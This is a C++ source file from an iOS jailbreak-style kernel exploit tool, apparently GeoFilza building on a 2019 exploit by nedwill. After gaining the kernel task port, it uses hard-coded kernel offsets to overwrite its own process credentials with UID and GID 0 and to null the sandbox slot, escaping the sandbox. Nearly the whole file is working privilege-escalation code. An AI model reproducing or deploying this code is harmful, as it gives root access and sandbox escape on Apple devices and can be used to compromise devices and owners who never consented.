// <3 nedwill 2019
#include <stdio.h>
#include "main.h"

extern "C" {
#include "iosurface.h"
#include "parameters.h"
#include "kernel_memory.h"
#include "offsets.h"
#include "LibOffset.h"
}

#include "exploit.h"
unsigned off_ucred_cr_uid = 0x18;
unsigned off_ucred_cr_ruid = 0x1c;
unsigned off_ucred_cr_svuid = 0x20;
unsigned off_ucred_cr_ngroups = 0x24;
unsigned off_ucred_cr_groups = 0x28;
unsigned off_ucred_cr_rgid = 0x68;
unsigned off_ucred_cr_svgid = 0x6c;
unsigned off_ucred_cr_label = 0x78;
unsigned off_p_pid = 0x60;
unsigned off_task = 0x10;
unsigned off_p_uid = 0x28;
unsigned off_p_gid = 0x2C;
unsigned off_p_ruid = 0x30;
unsigned off_p_rgid = 0x34;
unsigned off_p_ucred = 0xF8;
unsigned off_p_csflags = 0x290;
unsigned off_p_comm = 0x250;
unsigned off_p_textvp = 0x230;
unsigned off_p_textoff = 0x238;
unsigned off_p_cputype = 0x2A8;
unsigned off_p_cpu_subtype = 0x2AC;
unsigned off_sandbox_slot = 0x10;

uint64_t findOurselves(){
    static uint64_t currProc = 0;
    if (!currProc) {
        currProc = kernel_read64(current_task + OFFSET(task, bsd_info));
        printf("[i] Found Ourselves at 0x%llx\n", currProc);
    }
    return currProc;
}

int exploiter() {
  IOSurface_init();

  if (!parameters_init()) {
    printf("failed to initialized parameters\n");
    return 0;
  }

  Exploit exploit;
  if (!exploit.GetKernelTaskPort()) {
    printf("Exploit failed\n");
  } else {
    printf("Exploit succeeded\n");
      // GID
      printf("[i] Preparing to elevate own privileges!\n");
      uint64_t selfProc = findOurselves();
      uint64_t creds = kernel_read64(selfProc + off_p_ucred);
      
      kernel_write32(selfProc + off_p_gid, 0);
      kernel_write32(selfProc + off_p_rgid, 0);
      kernel_write32(creds + off_ucred_cr_rgid, 0);
      kernel_write32(creds + off_ucred_cr_svgid, 0);
      printf("[i] STILL HERE!!!!\n");
      
      // UID
      creds = kernel_read64(selfProc + off_p_ucred);
      kernel_write32(selfProc + off_p_uid, 0);
      kernel_write32(selfProc + off_p_ruid, 0);
      kernel_write32(creds + off_ucred_cr_uid, 0);
      kernel_write32(creds + off_ucred_cr_ruid, 0);
      kernel_write32(creds + off_ucred_cr_svuid, 0);
      printf("[i] Set UID = 0\n");
      
      // ShaiHulud
      creds = kernel_read64(selfProc + off_p_ucred);
      uint64_t cr_label = kernel_read64(creds + off_ucred_cr_label);
      kernel_write64(cr_label + off_sandbox_slot, 0);
      printf("GeoFilza by with patches created by GeoSn0w (@FCE365)\n");
  }

  IOSurface_deinit();
  return 0;
}
